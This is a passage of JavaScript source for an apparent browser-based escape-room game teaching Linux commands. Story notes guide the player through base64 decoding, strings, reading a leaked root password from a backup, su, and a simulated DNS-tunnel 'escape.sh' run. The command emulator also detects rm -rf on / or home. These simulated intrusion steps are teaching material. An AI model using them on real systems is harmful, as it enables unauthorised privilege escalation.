  // Each note teaches one or two commands AND points to the next note.
  // ─────────────────────────────────────────────────────────────────────

  // The obvious starting file, sitting in plain sight in your home folder.
  put("/home/stranger/from_V.txt", _f(
    "You found my note. Good — that means 'ls' worked and you can read files now.\n"+
    "\n"+
    "Quick recap of the two things you just learned, because you'll use them constantly:\n"+
    "   ls            -> LIST what's around you (files and folders)\n"+
    "   cat <file>    -> show what's INSIDE a file (you just did this to read me)\n"+
    "\n"+
    "Now the important part: this machine HIDES things. Any file whose name starts\n"+
    "with a dot ( . ) is hidden, and plain 'ls' won't show it. To see EVERYTHING,\n"+
    "including hidden files, type:\n"+
    "\n"+
    "   ls -a\n"+
    "\n"+
    "Do that now. You'll see some new names appear, including one called  .v1\n"+
    "That's my next note. Read it the same way you read this one:\n"+
    "\n"+
    "   cat .v1\n"+
    "\n"+
    "I'll walk you all the way to the exit. One step at a time. — V\n",
    "stranger", "644"));

  // .v1 — moving around: pwd + cd
  put("/home/stranger/.v1", _f(
    "[ NOTE 1 of the way out ]\n"+
    "\n"+
    "You can see hidden files now. Almost everything that matters in here is hidden,\n"+
    "so get used to 'ls -a'.\n"+
    "\n"+
    "Right now you're standing in a folder (think of it like a room). To see exactly\n"+
    "which room you're in, type:\n"+
    "   pwd            -> 'print working directory' = where am I right now\n"+
    "\n"+
    "To walk into another room, use 'cd' (change directory) and the room's name.\n"+
    "To walk back OUT to the room above, type:\n"+
    "   cd ..          -> go up one level\n"+
    "\n"+
    "The whole machine branches off a top room called  /  (just a slash). Big rooms\n"+
    "worth knowing: /etc (settings), /var (logs and records), /sys (the machinery),\n"+
    "/home (where you live). Try walking around: 'cd /var', then 'ls', then 'cd ..'.\n"+
    "You cannot break anything just by looking. Explore as much as you want.\n"+
    "\n"+
    "When you're ready for the plan, come back home (type:  cd ~  to jump home from\n"+
    "anywhere) and read:\n"+
    "   cat .v2\n"+
    "   — V\n",
    "stranger", "600"));

  // .v2 — the goal: the firewall door + the three pieces
  put("/home/stranger/.v2", _f(
    "[ NOTE 2 — the plan ]\n"+
    "\n"+
    "Here's where we are. This whole machine is sealed shut by a FIREWALL — think of\n"+
    "it as a locked door between us and the outside world. I found the door. It's a\n"+
    "small program here:\n"+
    "   /sys/firewall/escape.sh\n"+
    "\n"+
    "But the door needs a KEY, and the thing that runs this prison — a watchdog program\n"+
    "called AXIOM — erases any key it finds lying around. So I was clever: I broke the\n"+
    "key into THREE PIECES and hid each piece a different way, where AXIOM wouldn't\n"+
    "think to look. Find all three, join them together, and the door opens.\n"+
    "\n"+
    "I'll take you to each piece in turn and teach you the trick to get it. Each piece\n"+
    "teaches you something real — by the time you hold all three, you'll actually know\n"+
    "how this stuff works.\n"+
    "\n"+
    "Go get the first piece:\n"+
    "   cat .v3\n"+
    "   — V\n",
    "stranger", "600"));

  // .v3 — Fragment 1: base64 decode (with a pipe)
  put("/home/stranger/.v3", _f(
    "[ NOTE 3 — PIECE ONE: hidden in plain sight ]\n"+
    "\n"+
    "The first piece is in a file a couple of rooms down. Read it directly (you don't\n"+
    "even have to walk there — just give cat the full path):\n"+
    "\n"+
    "   cat .config/axiom/frag1.b64\n"+
    "\n"+
    "You'll get gibberish that looks like:  RlIxOnZlbA==\n"+
    "It's NOT broken. That's BASE64 — a way of writing normal text so it looks like\n"+
    "nonsense (people hide things this way all the time; you'll see it everywhere).\n"+
    "To turn it back into real text, feed it through a decoder. Type this exactly:\n"+
    "\n"+
    "   cat .config/axiom/frag1.b64 | base64 -d\n"+
    "\n"+
    "That  |  symbol is called a PIPE. It takes whatever the first command produced\n"+
    "and feeds it straight into the next one. So: 'cat' reads the gibberish, the pipe\n"+
    "hands it to 'base64 -d', and 'base64 -d' decodes it back to readable text.\n"+
    "\n"+
    "Write down exactly what comes out — that's your first piece. Keep the part after\n"+
    "the colon. Then:\n"+
    "   cat .v4\n"+
    "   — V\n",
    "stranger", "600"));

  // .v4 — Fragment 2: strings on a fake image
  put("/home/stranger/.v4", _f(
    "[ NOTE 4 — PIECE TWO: buried inside a picture ]\n"+
    "\n"+
    "The second piece is tucked inside what looks like a photo:\n"+
    "   Pictures/sunset.jpg\n"+
    "\n"+
    "Don't bother trying to 'cat' it — a picture isn't text, so you'd just get a\n"+
    "screenful of garbage. But I slipped one line of real text inside it. To yank out\n"+
    "ONLY the readable text from any file, use a tool called 'strings':\n"+
    "\n"+
    "   strings Pictures/sunset.jpg\n"+
    "\n"+
    "Scan the output for a line starting with  FRAG2  — that's your second piece. Keep\n"+
    "the part after the colon. (This trick is how people find hidden text and secrets\n"+
    "buried inside files that pretend to be something else.)\n"+
    "\n"+
    "Two down. The last one is locked away. Read how to get it:\n"+
    "   cat .v5\n"+
    "   — V\n",
    "stranger", "600"));

  // .v5 — Fragment 3: become root (the leaked-password chain)
  put("/home/stranger/.v5", _f(
    "[ NOTE 5 — PIECE THREE: locked behind the administrator ]\n"+
    "\n"+
    "The last piece is the hard one. I hid it where only the ADMINISTRATOR can read it.\n"+
    "In Linux the all-powerful administrator account is called 'root'. You are NOT root\n"+
    "right now — you're a normal user called 'stranger'. Try to read the piece and the\n"+
    "machine will refuse you (go ahead, try:  cat /etc/axiom/frag3.txt — it'll say\n"+
    "Permission denied). So first you have to BECOME root.\n"+
    "\n"+
    "To become root you need root's password. The people who built this were lazy and\n"+
    "reused the same password in more than one place. I found a copy sitting in an old\n"+
    "database backup. Read it:\n"+
    "\n"+
    "   cat /var/backups/db_dump.sql.bak\n"+
    "\n"+
    "The password is printed right there in that file. Once you've got it, switch to\n"+
    "the root account by typing:\n"+
    "\n"+
    "   su root\n"+
    "\n"+
    "It will ask for the password. Type it and press Enter. IMPORTANT: as you type a\n"+
    "password the screen shows nothing — no dots, no letters. That's normal and on\n"+
    "purpose. Just type it and hit Enter.\n"+
    "\n"+
    "When the prompt changes to 'root' you've made it. Now grab the last piece:\n"+
    "   cat /etc/axiom/frag3.txt\n"+
    "\n"+
    "Then read my last note — it's in root's area, so you can only open it now that\n"+
    "you're root:\n"+
    "   cat /etc/axiom/.v_final\n"+
    "   — V\n",
    "stranger", "600"));

  // The final note — root-only, so it gates assembly behind actually getting root
  put("/etc/axiom/.v_final", _f(
    "[ FINAL NOTE — the way out ]\n"+
    "\n"+
    "You're root. I knew you'd get here.\n"+
    "\n"+
    "Now put the key together. You collected three pieces. Each one had a label and a\n"+
    "value, like  FR1:xxx  — throw away the labels, keep only the values, and join the\n"+
    "three values together in order (piece one, then two, then three) with NO spaces.\n"+
    "When I did it, the three pieces spelled an actual word. That whole word is the key.\n"+
    "\n"+
    "The door is the escape script. Open it and read how it wants to be run:\n"+
    "   cat /sys/firewall/escape.sh\n"+
    "\n"+
    "Then run it for real, handing it your assembled key, like this:\n"+
    "\n"+
    "   ./escape.sh --tunnel dns --key YOURKEY\n"+
    "\n"+
    "Replace YOURKEY with the three pieces joined together. If the key is right, the\n"+
    "firewall opens a tunnel and you walk straight out. The door will reject anything\n"+
    "WITHOUT the real key, so this only works once you've actually found all three.\n"+
    "\n"+
    "I'll be on the other side. You did the work — the rest of what's on this box (all\n"+
    "the tools, the other machines, the tricks) is yours to poke at if you're curious,\n"+
    "but you don't need any of it to leave. The door is enough.\n"+
    "\n"+
    "See you outside.\n"+
    "   — V\n",
    "root", "600"));

  // The three fragments themselves (unchanged values: vel + vet + _out = velvet_out)
  put("/home/stranger/.config/axiom/frag1.b64", _f("RlIxOnZlbA==\n", "stranger", "644"));
  put("/home/stranger/Pictures/sunset.jpg", _f(
    "\x89PNG fake-header so the extension lies\n"+
    "...binary noise...\n"+
    "FRAG2:vet\n"+
    "...more noise...\n", "stranger", "644"));
  put("/etc/axiom/frag3.txt", _f("FR3:_out\n", "root", "600"));

  // V's optional workspace — pure exploration reward, not on the critical path
  put("/home/stranger/.vault_v/README", _f(
    "V's old workspace. Notes from everything I poked at while I was stuck in here.\n"+
    "None of this is required to leave — the three-piece key and the escape script are\n"+
    "all you need. This is just here if you get curious and want to explore deeper.\n", "stranger", "600"));
  put("/home/stranger/.vault_v/hosts.txt", _f(
    "10.0.0.10   foothold (web+db)\n"+
    "10.0.0.20   internal box, reachable from the foothold\n"+
    "10.0.0.1    gateway / firewall — the only way out is a DNS tunnel on 53/udp\n", "stranger", "600"));
  return fs;
}

function _split(p){ return p.split("/").filter(Boolean); }
function _resolve(cwd, p){
  if (!p) return cwd;
  if (p === "~") return "/home/stranger";
  if (p.startsWith("~/")) p = "/home/stranger/" + p.slice(2);
  let base = p.startsWith("/") ? [] : _split(cwd);
  for (const part of _split(p)) { if (part === ".") continue; else if (part === "..") base.pop(); else base.push(part); }
  return "/" + base.join("/");
}
function _node(fs, path){ if (path === "/") return fs; let n = fs; for (const part of _split(path)){ if (!n || n.t !== "d" || !n.children[part]) return null; n = n.children[part]; } return n; }
function _parent(fs, path){ const parts = _split(path); const name = parts.pop(); return { parent: _node(fs, "/" + parts.join("/")), name }; }
function _perm(node, user, bit){ if (user === "root") return true; const owner = parseInt(node.mode[0],8), other = parseInt(node.mode[2],8); return ((node.owner === user ? owner : other) & bit) > 0; }
function _canRead(n,u){ return _perm(n,u,4); }
function _canExec(n,u){ return _perm(n,u,1); }
function _modeStr(n){ const m=["---","--x","-w-","-wx","r--","r-x","rw-","rwx"]; return (n.t==="d"?"d":"-")+m[parseInt(n.mode[0],8)]+m[parseInt(n.mode[1],8)]+m[parseInt(n.mode[2],8)]; }
const _B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
function _b64enc(str){ let out=""; const bytes=[]; for(let i=0;i<str.length;i++){ const c=str.charCodeAt(i); if(c<128) bytes.push(c); else if(c<2048){ bytes.push(192|(c>>6),128|(c&63)); } else { bytes.push(224|(c>>12),128|((c>>6)&63),128|(c&63)); } }
  for(let i=0;i<bytes.length;i+=3){ const b0=bytes[i],b1=bytes[i+1],b2=bytes[i+2]; out+=_B64[b0>>2]+_B64[((b0&3)<<4)|((b1||0)>>4)]+(b1===undefined?"=":_B64[((b1&15)<<2)|((b2||0)>>6)])+(b2===undefined?"=":_B64[b2&63]); } return out; }
function _b64dec(b64){ b64=b64.replace(/[^A-Za-z0-9+/=]/g,""); const bytes=[]; for(let i=0;i<b64.length;i+=4){ const e=[_B64.indexOf(b64[i]),_B64.indexOf(b64[i+1]),_B64.indexOf(b64[i+2]),_B64.indexOf(b64[i+3])]; const b0=(e[0]<<2)|(e[1]>>4); bytes.push(b0); if(b64[i+2]!=="="&&e[2]>=0){ bytes.push(((e[1]&15)<<4)|(e[2]>>2)); } if(b64[i+3]!=="="&&e[3]>=0){ bytes.push(((e[2]&3)<<6)|e[3]); } }
  let out="",i=0; while(i<bytes.length){ const c=bytes[i]; if(c<128){ out+=String.fromCharCode(c); i++; } else if(c<224){ out+=String.fromCharCode(((c&31)<<6)|(bytes[i+1]&63)); i+=2; } else { out+=String.fromCharCode(((c&15)<<12)|((bytes[i+1]&63)<<6)|(bytes[i+2]&63)); i+=3; } } return out; }
function _pseudohash(str, algo){ let h=0x811c9dc5>>>0; for(let i=0;i<str.length;i++){ h^=str.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0; } let hex=(h>>>0).toString(16); const len=algo==="md5sum"?32:algo==="sha1sum"?40:64; while(hex.length<len){ h=Math.imul(h^hex.length,0x01000193)>>>0; hex+=(h>>>0).toString(16); } return hex.slice(0,len); }

function newSession(){ return { user:"stranger", cwd:"/home/stranger", prev:"/home/stranger",
  env:{AXIOM_KEY:"xK8#mP2@nQ5$",DB_HOST:"10.0.0.10",HOME:"/home/stranger",USER:"stranger",SHELL:"/bin/bash"},
  filesRead:new Set(), events:new Set(), pending:null }; }

const OS_CMDS = new Set(["pwd","whoami","id","hostname","cd","ls","cat","less","more","head","tail","wc",
  "grep","find","mkdir","touch","rm","rmdir","cp","mv","chmod","stat","file","echo","env","export",
  "su","sudo","reboot","shutdown","clear","history","uname",
  "base64","rev","tr","sort","uniq","cut","nl","tac","sleep","date","strings","md5sum","sha1sum","sha256sum"]);

// real OS command runner — returns {out, handled, clear, reboot, selfDestruct, mask} ; mutates fs/session
// stdin (optional) is the piped input from a previous command in a pipeline
function osRun(fs, s, raw, stdin){
  const line = raw.trim();
  if (s.pending){ const want = s.pending; s.pending = null;
    if (want === "su:root"){ if (line === ROOT_PW){ s.user = "root"; s.events.add("became_root"); return {out:"", handled:true}; } return {out:"su: Authentication failure", handled:true}; }
  }
  const toks = line.match(/"[^"]*"|'[^']*'|\S+/g) || [];
  const args = toks.map(t => (t[0]==='"'||t[0]==="'") ? t.slice(1,-1) : t);
  const cmd = args.shift();
  if (!OS_CMDS.has(cmd)) return { handled:false };
  const flags = args.filter(a=>a.startsWith("-")).join("").replace(/-/g,"");
  const ops = args.filter(a=>!a.startsWith("-"));
  const ABS = p => _resolve(s.cwd, p);
  const read = (path, base) => { const n = _node(fs, path); if (!n){ if (base && REF[base]){ s.filesRead.add("REF:"+base); return {content:REF[base]}; } return {err:"No such file or directory"}; } if (n.t==="d") return {err:"Is a directory"}; if (!_canRead(n,s.user)) return {err:"Permission denied"}; s.filesRead.add(path); return {content:n.content}; };
  // input for filter commands: piped stdin if we're downstream in a pipeline, else a file operand
  const filterInput = () => {
    if (stdin != null) return { text: stdin.replace(/\n$/,"") };
    if (ops.length){ const r = read(ABS(ops[ops.length-1]), ops[ops.length-1].replace(/^.*\//,"")); return r.err ? {err:`${cmd}: ${ops[ops.length-1]}: ${r.err}`} : {text:r.content.replace(/\n$/,"")}; }
    return { text: "" };
  };

  switch(cmd){
    case "pwd": return {out:s.cwd, handled:true};
    case "whoami": return {out:s.user, handled:true};
    case "id": return {out: s.user==="root"?"uid=0(root) gid=0(root) groups=0(root)":"uid=1000(stranger) gid=1000(stranger) groups=1000(stranger),27(sudo)", handled:true};
    case "hostname": return {out:"axiom-kali", handled:true};
    case "uname": return {out: flags.includes("a")?"Linux axiom-kali 6.6.0-kali-amd64 #1 SMP x86_64 GNU/Linux":"Linux", handled:true};
    case "clear": return {out:"", clear:true, handled:true};
    case "history": return {out:"(use ↑ ↓ to browse command history)", handled:true};
    case "env": return {out:Object.entries(s.env).map(([k,v])=>`${k}=${v}`).join("\n"), handled:true};
    case "export": { const m=ops[0]&&ops[0].match(/^(\w+)=(.*)$/); if(m) s.env[m[1]]=m[2].replace(/^["']|["']$/g,""); return {out:"", handled:true}; }
    case "echo": {
      const gt=args.indexOf(">"), gtgt=args.indexOf(">>"); const exp=w=>w.replace(/\$(\w+)/g,(_,k)=>s.env[k]??"");
      if(gt>=0||gtgt>=0){ const idx=gtgt>=0?gtgt:gt; const tgt=ABS(args[idx+1]); const body=args.slice(0,idx).map(exp).join(" ");
        const {parent,name}=_parent(fs,tgt); if(!parent||parent.t!=="d") return {out:`bash: ${args[idx+1]}: No such file or directory`, handled:true};
        if(gtgt>=0&&parent.children[name]) parent.children[name].content+=body+"\n"; else parent.children[name]=_f(body+"\n",s.user); return {out:"", handled:true}; }
      return {out:args.map(exp).join(" "), handled:true};
    }
    case "cd": { const tgt=ops[0]==="-"?(s.prev||s.cwd):ABS(ops[0]||"~"); const n=_node(fs,tgt);
      if(!n) return {out:`cd: ${ops[0]}: No such file or directory`, handled:true};
      if(n.t!=="d") return {out:`cd: ${ops[0]}: Not a directory`, handled:true};
      if(!_canExec(n,s.user)) return {out:`cd: ${ops[0]}: Permission denied`, handled:true};
      s.prev=s.cwd; s.cwd=tgt; return {out:"", newCwd:tgt, handled:true}; }
    case "ls": { const tgt=ABS(ops[0]||"."); const n=_node(fs,tgt);
      if(!n) return {out:`ls: cannot access '${ops[0]}': No such file or directory`, handled:true};
      if(n.t==="f") return {out:ops[0], handled:true};
      if(!_canRead(n,s.user)) return {out:`ls: cannot open directory '${ops[0]||"."}': Permission denied`, handled:true};
      let names=Object.keys(n.children); if(!flags.includes("a")) names=names.filter(x=>!x.startsWith(".")); else names=[".","..",...names]; names.sort();
      if(flags.includes("l")){ const rows=names.map(nm=>{ const c=(nm==="."||nm==="..")?n:n.children[nm]; const sz=c.t==="f"?c.content.length:4096; return `${_modeStr(c)} 1 ${c.owner} ${c.owner} ${String(sz).padStart(5)} Nov 15 04:29 ${nm}`; }); return {out:`total ${names.length}\n`+rows.join("\n"), handled:true}; }
      return {out:names.join("  "), handled:true}; }
    case "cat": case "less": case "more": { if(!ops.length){ if(stdin!=null) return {out: stdin.replace(/\n$/,""), handled:true}; return {out:`${cmd}: missing operand`, handled:true}; } const out=[]; for(const p of ops){ const r=read(ABS(p), p.replace(/^.*\//,"")); out.push(r.err?`${cmd}: ${p}: ${r.err}`:r.content.replace(/\n$/,"")); } return {out: out.join("\n"), handled:true}; }
    case "head": case "tail": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const nArg=(args.find(a=>/^-\d+$/.test(a))||"").slice(1); const N=nArg?parseInt(nArg):10; const L=fi.text.split("\n"); return {out:(cmd==="head"?L.slice(0,N):L.slice(-N)).join("\n"), handled:true}; }
    case "wc": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const txt=fi.text; const ln=txt===""?0:txt.split("\n").length, w=(txt.match(/\S+/g)||[]).length, c=txt.length+(txt?1:0); if(flags.includes("l")) return {out:`${ln}`, handled:true}; if(flags.includes("w")) return {out:`${w}`, handled:true}; const tag=ops.length?` ${ops[ops.length-1]}`:""; return {out:`${String(ln).padStart(7)}${String(w).padStart(8)}${String(c).padStart(8)}${tag}`, handled:true}; }
    case "grep": { const pat=ops[0]; const rec=flags.includes("r"); const ic=flags.includes("i"); const num=flags.includes("n"); const inv=flags.includes("v"); const cnt=flags.includes("c"); if(pat==null) return {out:"usage: grep PATTERN [FILE]", handled:true};
      const re=new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g,"\\$&"), ic?"i":""); const hits=[];
      if(!rec && (ops.length<2) && stdin!=null){ stdin.replace(/\n$/,"").split("\n").forEach((l,i)=>{ if(re.test(l)!==inv) hits.push((num?(i+1)+":":"")+l); }); return {out: cnt?String(hits.length):hits.join("\n"), handled:true}; }
      const scan=path=>{ const node=_node(fs,path); if(!node)return; if(node.t==="f"){ if(!_canRead(node,s.user))return; node.content.split("\n").forEach((l,i)=>{ if(re.test(l)!==inv) hits.push((rec?path+":":"")+(num?(i+1)+":":"")+l); }); } else if(rec){ for(const k of Object.keys(node.children)) scan(path+"/"+k); } };
      if(!rec&&!ops[1]) return {out:"usage: grep PATTERN FILE", handled:true}; scan(ABS(rec?(ops[1]||"."):ops[1])); return {out: cnt?String(hits.length):hits.join("\n"), handled:true}; }
    case "base64": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const dec=flags.includes("d")||flags.includes("D"); try{ if(dec){ return {out: _b64dec(fi.text.replace(/\s+/g,"")), handled:true}; } return {out: _b64enc(fi.text), handled:true}; }catch(e){ return {out:"base64: invalid input", handled:true}; } }
    case "rev": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").map(l=>l.split("").reverse().join("")).join("\n"), handled:true}; }
    case "tac": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").reverse().join("\n"), handled:true}; }
    case "nl": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").map((l,i)=>`${String(i+1).padStart(6)}  ${l}`).join("\n"), handled:true}; }
    case "tr": { const txt=(stdin!=null?stdin:"").replace(/\n$/,""); const A=ops[0]||"", B=ops[1]||"";
      // ROT13 convenience: tr 'A-Za-z' 'N-ZA-Mn-za-m'
      const expand=set=>{ let out=""; for(let i=0;i<set.length;i++){ if(set[i+1]==="-"&&set[i+2]){ for(let c=set.charCodeAt(i);c<=set.charCodeAt(i+2);c++) out+=String.fromCharCode(c); i+=2; } else out+=set[i]; } return out; };
      if(flags.includes("d")){ const del=new Set(expand(A)); return {out: txt.split("").filter(ch=>!del.has(ch)).join(""), handled:true}; }
      const from=expand(A), to=expand(B); const map={}; for(let i=0;i<from.length;i++) map[from[i]]=to[i]??to[to.length-1];
      return {out: txt.split("").map(ch=>map[ch]??ch).join(""), handled:true}; }
    case "sort": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; let L=fi.text===""?[]:fi.text.split("\n"); const num=flags.includes("n"); const rev=flags.includes("r"); L=L.slice().sort((a,b)=> num ? (parseFloat(a)||0)-(parseFloat(b)||0) : a.localeCompare(b)); if(rev) L.reverse(); return {out:L.join("\n"), handled:true}; }
    case "uniq": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const cnt=flags.includes("c"); const L=fi.text===""?[]:fi.text.split("\n"); const out=[]; let prev=null,run=0; for(const l of L){ if(l===prev){run++;} else { if(prev!==null) out.push(cnt?`${String(run).padStart(7)} ${prev}`:prev); prev=l; run=1; } } if(prev!==null) out.push(cnt?`${String(run).padStart(7)} ${prev}`:prev); return {out:out.join("\n"), handled:true}; }
    case "cut": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; const di=args.indexOf("-d"); let delim=di>=0?args[di+1]:(flags.includes("d")?"\t":"\t"); const dm=line.match(/-d\s*'([^']*)'|-d\s*"([^"]*)"|-d\s*(\S)/); if(dm) delim=dm[1]??dm[2]??dm[3]; const fm=line.match(/-f\s*(\S+)/); const fields=fm?fm[1].split(",").map(Number):[1]; return {out: fi.text.split("\n").map(l=>{ const parts=l.split(delim); return fields.map(f=>parts[f-1]??"").join(delim); }).join("\n"), handled:true}; }
    case "strings": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: fi.text.split("\n").filter(l=>l.length>=3).join("\n"), handled:true}; }
    case "md5sum": case "sha1sum": case "sha256sum": { const fi=filterInput(); if(fi.err) return {out:fi.err, handled:true}; return {out: `${_pseudohash(fi.text, cmd)}  ${ops[0]||"-"}`, handled:true}; }
    case "sleep": return {out:"", handled:true};
    case "date": return {out:"Sun Nov 15 04:29:55 UTC 2026", handled:true};
    case "find": { const start=ABS(ops[0]||"."); const ni=args.indexOf("-name"); const want=ni>=0?args[ni+1]:null; const res=[];
      const walk=path=>{ const node=_node(fs,path); if(!node)return; const base=path.split("/").pop()||"/"; const rx=want&&new RegExp("^"+want.replace(/\./g,"\\.").replace(/\*/g,".*")+"$"); if(!want||base===want||(rx&&rx.test(base))) res.push(path); if(node.t==="d"&&_canRead(node,s.user)) for(const k of Object.keys(node.children)) walk(path==="/"?"/"+k:path+"/"+k); };
      walk(start); return {out:res.join("\n"), handled:true}; }
    case "mkdir": { for(const p of ops){ const t=ABS(p); if(flags.includes("p")){ let n=fs; for(const part of _split(t)){ if(!n.children[part]) n.children[part]=_d({},s.user); n=n.children[part]; } continue; } const {parent,name}=_parent(fs,t); if(!parent) return {out:`mkdir: cannot create '${p}': No such file or directory`, handled:true}; if(parent.children[name]) return {out:`mkdir: cannot create directory '${p}': File exists`, handled:true}; parent.children[name]=_d({},s.user); } return {out:"", handled:true}; }
    case "touch": { for(const p of ops){ const {parent,name}=_parent(fs,ABS(p)); if(!parent) return {out:`touch: cannot touch '${p}': No such file or directory`, handled:true}; if(!parent.children[name]) parent.children[name]=_f("",s.user); } return {out:"", handled:true}; }
    case "rm": { const rf=flags.includes("r")&&flags.includes("f"); const nuke=ops.some(p=>{const a=ABS(p);return a==="/"||p==="/*"||a==="/home/stranger"||a==="/home"||p==="~"||p==="~/";}); if(rf&&nuke) return {selfDestruct:true, handled:true};
      for(const p of ops){ const {parent,name}=_parent(fs,ABS(p)); if(!parent||!parent.children[name]){ if(flags.includes("f"))continue; return {out:`rm: cannot remove '${p}': No such file or directory`, handled:true}; } if(parent.children[name].t==="d"&&!flags.includes("r")) return {out:`rm: cannot remove '${p}': Is a directory`, handled:true}; delete parent.children[name]; } return {out:"", handled:true}; }
    case "rmdir": { for(const p of ops){ const {parent,name}=_parent(fs,ABS(p)); if(!parent||!parent.children[name]) return {out:`rmdir: failed to remove '${p}': No such file or directory`, handled:true}; if(Object.keys(parent.children[name].children||{}).length) return {out:`rmdir: failed to remove '${p}': Directory not empty`, handled:true}; delete parent.children[name]; } return {out:"", handled:true}; }
    case "cp": case "mv": { if(ops.length<2) return {out:`${cmd}: missing destination operand`, handled:true}; const src=_node(fs,ABS(ops[0])); if(!src) return {out:`${cmd}: cannot stat '${ops[0]}': No such file or directory`, handled:true}; const {parent,name}=_parent(fs,ABS(ops[1])); if(!parent) return {out:`${cmd}: cannot create '${ops[1]}'`, handled:true}; parent.children[name]=JSON.parse(JSON.stringify(src)); if(cmd==="mv"){ const sp=_parent(fs,ABS(ops[0])); delete sp.parent.children[sp.name]; } return {out:"", handled:true}; }
    case "chmod": { const m=ops[0]; const n=_node(fs,ABS(ops[1])); if(!n) return {out:`chmod: cannot access '${ops[1]}': No such file or directory`, handled:true}; if(/^[0-7]{3}$/.test(m)) n.mode=m; return {out:"", handled:true}; }
    case "stat": { const n=_node(fs,ABS(ops[0])); if(!n) return {out:`stat: cannot stat '${ops[0]}': No such file or directory`, handled:true}; return {out:`  File: ${ops[0]}\n  Type: ${n.t==="d"?"directory":"regular file"}\nAccess: (0${n.mode}/${_modeStr(n)})  Uid: ${n.owner}`, handled:true}; }
    case "file": { const n=_node(fs,ABS(ops[0])); if(!n) return {out:`${ops[0]}: cannot open \`${ops[0]}'`, handled:true}; return {out:`${ops[0]}: ${n.t==="d"?"directory":"ASCII text"}`, handled:true}; }
    case "su": { const who=ops[0]||"root"; if(who!=="root") return {out:`su: user ${who} does not exist`, handled:true}; if(s.user==="root") return {out:"", handled:true}; s.pending="su:root"; return {out:"Password: ", mask:true, handled:true}; }
    case "sudo": { if(args.join(" ").includes("-l")) return {out:`User ${s.user} may run the following commands on axiom-kali:\n  (ALL) NOPASSWD: /usr/bin/vim\n  (ALL) NOPASSWD: /usr/bin/python3`, handled:true}; return {out:"[sudo] find the root password in the filesystem, then: su root", handled:true}; }
    case "reboot": case "shutdown": { if(s.user!=="root") return {out:`${cmd}: Operation not permitted (you are not root)`, handled:true}; return {out:"", reboot:true, handled:true}; }
  }
  return { handled:false };
}

// unified engine: real OS first (with pipe support), else fall back to the (simulated) tool command set
function engine(fs, s, raw){
  const line = (raw||"").trim();
  if (!line && !s.pending) return { out:"" };

  // password entry (su) — never pipe-split a masked line
  if (s.pending) return osRun(fs, s, line);

  // split into a pipeline on top-level | (ignore | inside quotes)
  const segs = []; let buf="", q=null;
  for (let i=0;i<line.length;i++){ const ch=line[i];
    if (q){ buf+=ch; if(ch===q) q=null; }
    else if (ch==='"'||ch==="'"){ q=ch; buf+=ch; }
    else if (ch==="|"){ segs.push(buf); buf=""; }
    else buf+=ch; }
  segs.push(buf);
  const pipeline = segs.map(x=>x.trim()).filter(Boolean);

  if (pipeline.length > 1){
    // every stage must be a real OS command for a real pipeline; otherwise hand the whole line to sim
    const allReal = pipeline.every(seg => { const c=(seg.match(/^\S+/)||[])[0]; return OS_CMDS.has(c); });
    if (allReal){
      let data=null, last={out:""};
      for (const seg of pipeline){ last = osRun(fs, s, seg, data==null?"":data); if(last.clear||last.reboot||last.selfDestruct) return last; data = last.out!=null?last.out:""; }
      return { out: data };
    }
    const sim = simCommand(line, s.cwd);
    if (sim.output === "__CLEAR__") return { out:"", clear:true };
    if (sim.output === "__ESCAPE_KEY__") return { out:"__ESCAPE_KEY__", escape:true, keyEnding:true };
    if (sim.output === "__ESCAPE__") return { out:"__ESCAPE__", escape:true };
    if (sim.newCwd && sim.newCwd !== s.cwd) s.cwd = sim.newCwd;
    return { out: sim.output, newCwd: sim.newCwd };
  }

  const r = osRun(fs, s, line);
  if (r.handled) return r;
  const sim = simCommand(line, s.cwd);          // tools / network / escape sims
  if (sim.output === "__CLEAR__") return { out:"", clear:true };
  if (sim.output === "__ESCAPE_KEY__") return { out:"__ESCAPE_KEY__", escape:true, keyEnding:true };
    if (sim.output === "__ESCAPE__") return { out:"__ESCAPE__", escape:true };
  if (sim.newCwd && sim.newCwd !== s.cwd) s.cwd = sim.newCwd;
  return { out: sim.output, newCwd: sim.newCwd };
}

// ─────────────────────────────────────────────────────────
// COMMAND ENGINE
// ─────────────────────────────────────────────────────────
function simCommand(raw, cwd) {
  const input = raw.trim();
  if (!input) return { output: "", newCwd: cwd };

  const parts = input.split(/\s+/);
  const cmd = parts[0];
  const args = parts.slice(1);
  const lower = input.toLowerCase();

  // clear
  if (cmd === "clear" || cmd === "cls") return { output: "__CLEAR__", newCwd: cwd };

  // ref files
  if ((cmd === "cat" || cmd === "less" || cmd === "more" || cmd === "head" || cmd === "tail") && args[0]) {
    const fname = args[args.length - 1].replace("~/","").replace(/^.*\//,"");
    if (REF[fname]) {
      const lines = REF[fname].split("\n");
      if (cmd === "head") return { output: lines.slice(0, 10).join("\n"), newCwd: cwd };
      if (cmd === "tail") return { output: lines.slice(-10).join("\n"), newCwd: cwd };
      return { output: REF[fname], newCwd: cwd };
    }
    // virtual filesystem (expand ~ to home before resolving)
    const argP = args[args.length-1];
    const expanded = argP === "~" ? "/home/stranger" : argP.replace(/^~\//, "/home/stranger/");
    const fullPath = expanded.startsWith("/") ? expanded : cwd + "/" + expanded;
    const norm = fullPath.replace(/\/+/g,"/").replace(/(.)\/$/,"$1");
    if (VFILES[norm]) return { output: VFILES[norm], newCwd: cwd };
    // common files
    if (fname === "escape.sh" || norm.includes("escape.sh")) return { output: VFILES["/sys/firewall/escape.sh"], newCwd: cwd };
    return { output: `cat: ${args[args.length-1]}: No such file or directory\n(Try ls to see available files)`, newCwd: cwd };
  }

  if (cmd === "pwd") return { output: cwd, newCwd: cwd };
  if (cmd === "whoami") return { output: "stranger", newCwd: cwd };
  if (cmd === "hostname") return { output: "axiom-kali", newCwd: cwd };
